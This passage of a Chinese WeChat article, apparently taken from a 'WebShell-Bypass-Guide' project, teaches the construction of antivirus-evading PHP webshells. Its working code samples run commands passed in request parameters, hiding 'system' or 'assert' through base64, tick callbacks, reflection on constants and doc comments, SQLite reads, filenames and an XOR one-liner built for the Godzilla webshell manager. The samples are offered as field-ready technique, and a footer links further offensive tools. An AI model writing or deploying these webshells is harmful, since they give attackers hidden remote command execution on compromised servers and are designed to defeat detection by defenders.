  *   *   *   *   *   *   *   *   * 

    
    
    $decrpt = $_REQUEST['a'];$decrps = $_REQUEST['b'];$arrs = explode("|", $decrpt)[1];$arrs = explode("|", base64_decode($arrs));$arrt = explode("|", $decrps)[1];$arrt = explode("|", base64_decode($arrt)); call_user_func($arrs[0],$arrt[0]);传参内容：a=c3lzdGVt    //system的base64加密b=d2hvYW1p    //whoami的base64加密

也可以尝试使用其他编码或者加密方式进行传参

###

### 9.2 函数构造传参

可以用一些定义函数的函数来进行传参绕过，比如使用 `register_tick_function()` 这个函数

  *   *   *   *   *   * 

    
    
    register_tick_function ( callable $function [, mixed $... ] ) : bool例子如下：$f = $_REQUEST['f'];declare(ticks=1);register_tick_function ($f, $_REQUEST['aabyss']);  
    

## 10# 自定义函数绕过

通过自定义函数，将恶意代码内容隐藏于自定义函数当中，再进行拼接执行

###

### 10.1 简单自定义函数

这个要与其他的姿势进行结合，目前没办法通过简单自定义函数进行免杀

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    function out($b){    return $b;}function zhixin($a){    return system($a);}function post(){    return $_POST['aabyss'];}  
    function run(){    return out(zhixin)(out(post()));}  
    run();

###

### 10.2 读取已定义函数

获取某个类的全部已定义的常量，不管可见性如何定义

    
    
    public ReflectionClass::getConstants(void) : array

例子如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    class Test{    const a = 'Sy';    const b = 'st';    const c = 'em';        public function __construct(){    }}  
    $para1;$para2;$reflector = new ReflectionClass('Test');  
    for ($i=97; $i <= 99; $i++) {    $para1 = $reflector->getConstant(chr($i));    $para2.=$para1;}  
    foreach (array('_POST','_GET') as $_request) {    foreach ($$_request as $_key=>$_value) {        $$_key=  $_value;    }}  
    $para2($_value);

##

## 11# 读取字符串绕过

重点还是放在高危函数上，通过读取各种东西来获得对应字符串

###

### 11.1 读取注释

这里用到读取注释的函数

    
    
    ReflectionClass::getDocComment

例子如下：

  *   *   *   *   *   *   *   * 

    
    
    /**       * system($_GET[aabyss]);    */  class User { }  $user = new ReflectionClass('User');$comment = $user->getDocComment();$f = substr($comment , 14 , 22);eval($f);

###

### 11.2 读取数据库

可以通过 `file_put_contents` 文件写入函数写入一个Sqlite的数据库

  *   * 

    
    
    $datatest = "[文件的base64编码]";file_put_contents('./要写入的文件名', base64_decode($datatest));

然后通过PHP读取数据库内容提取高危函数，从而达到WebShell免杀效果

  *   *   *   *   *   *   *   *   *   * 

    
    
    $path = "数据库文件名"  
    $db = new PDO("sqlite:" . $path);  
    $sql_stmt = $db->prepare('select * from test where name="system"');$sql_stmt->execute();  
    $f = substr($sql_stmt->queryString, -7, 6);$f($_GET['b']);  
    

### 11.3 读取目录

`FilesystemIterator` 是一个迭代器，可以获取到目标目录下的所有文件信息

    
    
    public FilesystemIterator::next ( void ) : void

可以尝试使用 `file_put_contents` 写入一个名为 `system.aabyss` 的空文件，然后遍历目录拿到字符串 `system`
，成功ByPass

  *   *   *   *   *   *   * 

    
    
    $fi = new FilesystemIterator(dirname(__FILE__));$f = '';foreach($fi as $i){    if (substr($i->__toString(), -6,6)=='aabyss')  //判断后缀名为.aabyss的文件（其他特殊后缀也行）        $f = substr($i->__toString(), -13,6);      //从system.aabyss提取出system高危函数}$f($_GET['b']);

为什么要写入为 `system.aabyss` 这个文件名呢，因为特殊后缀能让代码快速锁定文件，不至于提取文件名提取到其他文件了

##

## 12# 多姿势配合免杀

将以上提到的相关姿势，进行多种配合嵌套，实现免杀效果

###

### 12.1 样例一

刚开始看这个样例我还是挺惊讶的，仔细分析了一波，发现还是挺简单的，但重在思路

这个样例使用了异或+变换参数的手法，成功规避了正则匹配式，具有实战意义

  * 

    
    
    <?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);

这时候，就可以执行GET传参：`?_=system&__=whoami` 来执行whoami命令

由8.1讲到PHP中如何异或，我们就先把最前面这部分拆出来看看

  *   *   * 

    
    
    <?=~$_='$<>/'^'{{{{';//即 '$<>/' ^ '{{{{'//即 "$<>/" 这部分字符串与后面 "{{{{" 这部分字符串异或

所以由我们前面所学的知识，加上自己动手实践一下，可以发现异或结果为 `_GET`

所以整个PHP语句解密后，再将 `_` 替换为 `a`，将 `__` 替换为 `b`，则原PHP转化为：

  * 

    
    
    $_GET['a']($_GET['b'])

当我们给 `a` 传 `system`，给 `b` 传 `whoami`，原式就会变成这样

  * 

    
    
    system('whoami');

既然上面的代码你看懂了，那不妨看一下下面魔改的代码：

  * 

    
    
    <?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);
    
    
      
    

直接用 Godzilla 哥斯拉来连接，如下：

![](https://gitee.com/fuli009/images/raw/master/public/20230624181202.png)

当然这里使用到 `assert` 高危函数，只能用于 `php` 在 `5.*` 的版本，相关姿势读者不妨自行拓展一下哈哈~

所以你学废了吗？更多有趣的WebShell免杀案例等我后续更新~

  

  

 ****

 **下载地址**

 **项目地址：https://github.com/AabyssZG/WebShell-Bypass-Guide**

 **  
**

 **点击最下方名片进入公众号**  

 **  
**

# **  往期推荐**  

[爬网站JS文件，自动fuzz
api接口，指定api接口](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247485069&idx=1&sn=e94bad6d0f927441b7cb5c533d2e369d&chksm=fcedb22acb9a3b3cfb57e9d40f8898c51fa4c9fa3562bd112b5d489f9cba5cf81637d1558b53&scene=21#wechat_redirect)  

[生成各类免杀webshell适合市面上常见的几种webshell管理工具、冰蝎、蚁剑、哥斯拉](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247485058&idx=1&sn=ac47be9a9d0c6aba0ec991e5213a903e&chksm=fcedb225cb9a3b3312a895ec7da3819216fde632546b644f943a6b31c3b6efa6db3624f6edf7&scene=21#wechat_redirect)  

[一款新的webshell管理工具](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247485049&idx=1&sn=e02753cc60ea620882710bf9cf7b23b0&chksm=fcedb2decb9a3bc82b6dc1d9da9bc9c112ceedf608732c8d3338b04c4ffa5b44ebe28355272c&scene=21#wechat_redirect)  

[浏览器插件--
右键检测图片是否存在Exif漏洞](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247485033&idx=1&sn=184c7486a3fb0f06b27885e881146561&chksm=fcedb2cecb9a3bd82564162a5a013261acad3b244ba67af527b211175701b5ebc617f731fafe&scene=21#wechat_redirect)  

[一个自动化通用爬虫
用于自动化获取网站的URL](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247485003&idx=1&sn=914d8bcd37af1e43ea293b20a6b7976e&chksm=fcedb2eccb9a3bfa7174dfba94b4b85570ab818f875acbcef26163c173ae7c67c4c153f6d191&scene=21#wechat_redirect)  

[一个查询IP地理信息和CDN服务提供商的离线终端工具](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484994&idx=1&sn=55a0986b58d7bff15e8f55fd4b495204&chksm=fcedb2e5cb9a3bf3bc6d55f4e292fa43b4cb563012593b0f7832c040e0616f2aac53975dc31b&scene=21#wechat_redirect)  

[红队批量脆弱点搜集工具](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484965&idx=1&sn=70e48cdcb7683b227bc3f8d8efd05a6a&chksm=fcedb282cb9a3b942c93edec939bf9943a66d7345c40916e3c17a369ace2d0a9eed83ccf5ae8&scene=21#wechat_redirect)  

[Spring漏洞综合利用工具——Spring_All_Reachable](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484989&idx=1&sn=bfa97e5279e921e26631b9f93a75eefe&chksm=fcedb29acb9a3b8c178d47f04eaee53aabeb8e27b2c06e12d7f8a0916ea288b2a7ad94f4da3e&scene=21#wechat_redirect)  

[利用字符集编码绕过waf的burpsuite插件](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484894&idx=1&sn=33cec3b0baa230be290d7c62935d0dd5&chksm=fcedb179cb9a386f103c044a2fcb481e31efc4358c808b38c7d4cd961ec99cbd72ac80175b8a&scene=21#wechat_redirect)  

[云安全-
AK/SK泄露利用工具](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484850&idx=1&sn=785ebf6284c536262a08a6713cbcac8a&chksm=fcedb115cb9a38030cfe0024ecd722b3269d6eeddcd0845433f73ab68660ed776019b7a1f649&scene=21#wechat_redirect)  

[可以自定义规则的密码字典生成器](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484816&idx=1&sn=80a19335226b0e242a36a85486c541fc&chksm=fcedb137cb9a382100c0fbb51875de2a1183f46acccced953d4ee927c3f627d8d8e4a3f660d4&scene=21#wechat_redirect)  

[MySql、Oracle、金仓、达梦、神通等数据库、Redis等管理工具](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484787&idx=1&sn=766263e71666745fca6a1fe71b016170&chksm=fcedb1d4cb9a38c2cccc8c58afb34b31677974540d45ad9db5f032c0eba6c7ff26527c0dbd2c&scene=21#wechat_redirect)  

[JNDI/LDAP注入利用工具](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484743&idx=1&sn=42224dd27e62cb0d7a5cbdebf4dbbf19&chksm=fcedb1e0cb9a38f6b091c5a753c80b411bb92197ea02439a0493886ad55b7203fed057ec7718&scene=21#wechat_redirect)  

[jmx未授权访问 弱口令批量检测 GUI工具 -
jmxbfGUI](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484738&idx=1&sn=3d7cf4b2ec5bc5a92de3db9c57fe036e&chksm=fcedb1e5cb9a38f3e8d8fce41bfd4ac22d001c075bfe2f1425f1a90643ede8b93bce377fa787&scene=21#wechat_redirect)  

[基于Golang的高并发子域名收集工具——FindSubs](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484731&idx=1&sn=cedd1f26bfe4227ae8932c77163d6938&chksm=fcedb19ccb9a388a5a3a5cb2ce9dcbfe0cc19e48846c590014d2894707f4f10fbd37579575bb&scene=21#wechat_redirect)  

[用友NC反序列化漏洞payload生成工具](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484724&idx=1&sn=d78ecac847f9245ac0275968fec10fa7&chksm=fcedb193cb9a38851d51cc14f0a07a659bfed23a1faab5a326260241eed995fe7c0378c13c05&scene=21#wechat_redirect)  

[一种另辟蹊径的免杀执行系统命令的木马](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484697&idx=1&sn=5daa5b99580bffd7e3db48bebd8e4fa2&chksm=fcedb1becb9a38a841f3fe2f6c6cdbfed5728b9171abcb1eee7645d6659d59e3a5148e7a6b7d&scene=21#wechat_redirect)  

[高并发红队打点横向移动内网渗透扫描器](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484625&idx=1&sn=24e58636f61c0f4542ea0aac467f774f&chksm=fcedb076cb9a396043968b283c67962c72b195f11646afd66db8d4b799701d066528838b3c14&scene=21#wechat_redirect)  

[一款go
shellcode免杀加载器](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484617&idx=1&sn=1b67b44ccc3f1e8056ce9ac15d4d90e4&chksm=fcedb06ecb9a3978f20b354be309e0f4ebbbc6d34ed283e937e872ec6a92564e13110b483b61&scene=21#wechat_redirect)  

[目录扫描+403状态绕过工具——dirsearch_bypass403](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484589&idx=1&sn=76a011ac81b8751e29374283b7dc2f94&chksm=fcedb00acb9a391c83816dfb653ea260e15bf80341585917d1bd892081e618f4ab430d404390&scene=21#wechat_redirect)  

[跨平台空间资产测绘——superSearchPlus](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484580&idx=1&sn=3beacb4e755b075c6eaf1cf805887719&chksm=fcedb003cb9a3915567143f81f553865ed6a872972b921c62093d5faa9de98d631f534ac426f&scene=21#wechat_redirect)  

[免杀php木马](http://mp.weixin.qq.com/s?__biz=MzU3MDU5ODg1Ng==&mid=2247484572&idx=1&sn=fcaefb5ae7793ad3576913b769a536a6&chksm=fcedb03bcb9a392dd11898b6f918b4a0daf23c414bff586ead9a7fc0d850f5e045aa025632f4&scene=21#wechat_redirect)  

  

  

加入微信群  

![](https://gitee.com/fuli009/images/raw/master/public/20230624181203.png)

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

